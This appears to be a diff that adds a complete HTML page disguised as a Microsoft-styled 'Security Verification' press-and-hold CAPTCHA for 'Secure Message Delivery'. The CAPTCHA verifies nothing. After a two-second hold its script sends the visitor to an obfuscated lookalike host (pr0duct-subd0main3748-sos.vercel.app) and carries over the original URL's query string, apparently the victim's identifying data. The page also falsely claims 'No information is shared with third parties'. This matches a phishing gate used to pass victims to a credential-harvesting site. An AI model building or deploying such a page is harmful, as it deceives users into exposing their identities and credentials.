@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Security Verification</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background: linear-gradient(135deg, #0078d7 0%, #106ebe 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .container {
+      background-color: #ffffff;
+      border-radius: 10px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+      width: 100%;
+      max-width: 450px;
+      overflow: hidden;
+    }
+
+    .header {
+      background: linear-gradient(to right, #0078d7, #106ebe);
+      color: white;
+      padding: 25px;
+      text-align: center;
+      position: relative;
+    }
+
+    .header-text {
+      font-size: 16px;
+      opacity: 0.9;
+      margin-top: 8px;
+    }
+
+    .security-badge {
+      background-color: rgba(255, 255, 255, 0.15);
+      border-radius: 20px;
+      padding: 6px 15px;
+      display: inline-block;
+      margin-top: 15px;
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .content-area {
+      padding: 30px;
+    }
+
+    .captcha-container {
+      background-color: #f8f9fc;
+      border-radius: 8px;
+      padding: 25px;
+      text-align: center;
+      border: 1px solid #eaeef7;
+      margin-bottom: 25px;
+    }
+
+    .captcha-title {
+      color: #1d2b4a;
+      font-size: 18px;
+      margin-bottom: 15px;
+      font-weight: 600;
+    }
+
+    .captcha-desc {
+      color: #5d6d8c;
+      font-size: 14px;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+
+    .captcha-btn {
+      background: linear-gradient(to right, #0078d7, #106ebe);
+      color: white;
+      border: none;
+      border-radius: 50px;
+      padding: 16px 0;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      width: 100%;
+      position: relative;
+      overflow: hidden;
+      transition: all 0.3s ease;
+    }
+
+    .captcha-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(0, 120, 215, 0.3);
+    }
+
+    .captcha-btn:active {
+      transform: translateY(0);
+    }
+
+    .progress-container {
+      height: 5px;
+      background-color: rgba(255, 255, 255, 0.3);
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      height: 100%;
+      background-color: white;
+      width: 0%;
+      transition: width 0.1s linear;
+    }
+
+    .captcha-icon {
+      margin-right: 8px;
+    }
+
+    .footer-note {
+      text-align: center;
+      color: #5d6d8c;
+      font-size: 13px;
+      margin-top: 20px;
+      line-height: 1.5;
+    }
+
+    .time-remaining {
+      color: #5d6d8c;
+      font-size: 13px;
+      margin-top: 15px;
+    }
+
+    .status-message {
+      font-weight: 600;
+      margin-top: 15px;
+      font-size: 16px;
+      min-height: 24px;
+    }
+
+    .verification-success {
+      color: #28a745;
+    }
+
+    .verification-error {
+      color: #dc3545;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <p class="header-text">Secure Message Delivery</p>
+      <div class="security-badge">
+        <i class="fas fa-lock"></i> Encrypted Connection
+      </div>
+    </div>
+
+    <div class="content-area">
+      <div class="captcha-container">
+        <h3 class="captcha-title">Security Verification</h3>
+        <p class="captcha-desc">Press and hold the button below to confirm you're not a robot. This helps us maintain a secure environment.</p>
+
+        <button id="captchaBtn" class="captcha-btn">
+          <i class="fas fa-fingerprint captcha-icon"></i> Press and Hold to Verify
+          <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+          </div>
+        </button>
+
+        <div class="time-remaining">Hold for 2 seconds to verify</div>
+        <div class="status-message" id="statusMessage"></div>
+      </div>
+
+      <div class="footer-note">
+        <i class="fas fa-shield-alt"></i> Your privacy and security are protected. No information is shared with third parties.
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const captchaBtn = document.getElementById('captchaBtn');
+      const progressBar = document.getElementById('progressBar');
+      const statusMessage = document.getElementById('statusMessage');
+
+      let holdTimer;
+      let progress = 0;
+      const requiredHoldTime = 2000;
+      let isVerifying = false;
+
+      captchaBtn.addEventListener('mousedown', startVerification);
+      captchaBtn.addEventListener('touchstart', startVerification);
+
+      captchaBtn.addEventListener('mouseup', stopVerification);
+      captchaBtn.addEventListener('mouseleave', stopVerification);
+      captchaBtn.addEventListener('touchend', stopVerification);
+
+      function startVerification(e) {
+        if (isVerifying) return;
+
+        e.preventDefault();
+        resetProgress();
+        isVerifying = true;
+
+        captchaBtn.innerHTML = '<i class="fas fa-fingerprint captcha-icon"></i> Verifying...';
+        statusMessage.textContent = '';
+
+        holdTimer = setInterval(() => {
+          progress += 10;
+          progressBar.style.width = progress + '%';
+
+          if (progress >= 100) {
+            completeVerification();
+          }
+        }, requiredHoldTime / 10);
+      }
+
+      function stopVerification() {
+        if (!isVerifying) return;
+
+        if (holdTimer) {
+          clearInterval(holdTimer);
+
+          if (progress < 100) {
+            captchaBtn.innerHTML = '<i class="fas fa-fingerprint captcha-icon"></i> Press and Hold to Verify';
+            statusMessage.textContent = 'Verification incomplete. Please try again.';
+            statusMessage.className = 'status-message verification-error';
+            resetProgress();
+          }
+        }
+
+        isVerifying = false;
+      }
+
+      function resetProgress() {
+        progress = 0;
+        progressBar.style.width = '0%';
+      }
+
+      function completeVerification() {
+        clearInterval(holdTimer);
+
+        captchaBtn.innerHTML = '<i class="fas fa-check-circle captcha-icon"></i> Verified';
+        captchaBtn.style.background = 'linear-gradient(to right, #28a745, #218838)';
+        statusMessage.textContent = 'Verification successful! Redirecting...';
+        statusMessage.className = 'status-message verification-success';
+
+        redirectPage();
+      }
+
+      function redirectPage() {
+        const generateRandomString = (length) => {
+          const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefhiklmnorstuvwxz0123456789';
+          return Array.from({ length }, () => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
+        };
+
+        const query = window.location.href;
+        const res = query.split('?');
+        const data2 = res[1];
+
+        const randomSubdomain = generateRandomString(15);
+        const baseUrl = `https://pr0duct-subd0main3748-sos.vercel.app/`;
+
+        window.location.href = data2 ? `${baseUrl}${data2}` : `${baseUrl}`;
+      }
+    });
+  </script>
+</body>
+</html>
